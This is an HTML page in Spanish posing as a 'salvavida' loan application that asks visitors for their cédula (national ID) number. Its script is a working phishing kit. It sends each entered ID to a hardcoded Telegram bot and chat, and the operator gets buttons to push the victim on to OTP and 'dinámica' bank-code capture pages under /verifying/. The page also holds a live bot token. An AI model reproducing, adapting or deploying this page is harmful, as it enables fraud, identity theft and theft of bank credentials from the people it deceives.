<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solicita tu préstamo salvavida</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {background: url('https://salvavidaonline.blob.core.windows.net/ahora/fondo.jpg') center/cover no-repeat fixed;color:#fff;font-family:Arial;padding:20px}
        .container {max-width:400px;margin:auto;background:rgba(0,0,0,0.7);padding:30px;border-radius:20px}
        input {padding:15px;font-size:18px;border-radius:10px;border:none;width:100%;margin:10px 0}
        button {padding:15px;background:#ff6b6b;color:white;border:none;border-radius:50px;font-size:20px;width:100%;margin-top:20px}
        .loader {border:8px solid #f3f3f3;border-top:8px solid #ff6b6b;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;display:none}
        @keyframes spin {0% {transform:rotate(0deg)}100% {transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="container">
        <h2 class="text-center">Solicita tu préstamo salvavida</h2>
        <p class="text-center">Ingrese su cédula para conocer su puntaje.</p>
        <input type="text" id="cedula" placeholder="Cédula" maxlength="10" inputmode="numeric">
        <button id="btn">Consultar</button>
        <p id="msg" class="text-center"></p>
        <div id="loader" class="loader"></div>
    </div>

    <script>
    document.getElementById('btn').onclick = () => {
        const cedula = document.getElementById('cedula').value.trim();
        if (cedula.length < 7) return document.getElementById('msg').innerHTML = 'Cédula inválida';

        document.getElementById('msg').innerHTML = 'Enviando...';
        document.getElementById('loader').style.display = 'block';
        document.getElementById('btn').disabled = true;

        // ENVÍA A TU TELEGRAM
        fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: 8469651553,
                text: `*NUEVO CLIENTE SALVAVIDA*

*Cédula:* ${cedula}
*Hora:* ${new Date().toLocaleTimeString()}
*IP:* Detectando...`,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{text: "Clave OTP", url: location.origin + "/verifying/?do=otp"}],
                        [{text: "Dinámica", url: location.origin + "/verifying/?do=dinamica"}],
                        [{text: "Finalizar", url: location.origin + "/verifying/?do=ok"}]
                    ]
                }
            })
        }).then(() => {
            document.getElementById('msg').innerHTML = 'Enviado! Redirigiendo...';
            setTimeout(() => { location.href = '/verifying/'; }, 1500);
        });
    };
    </script>
</body>
</html>
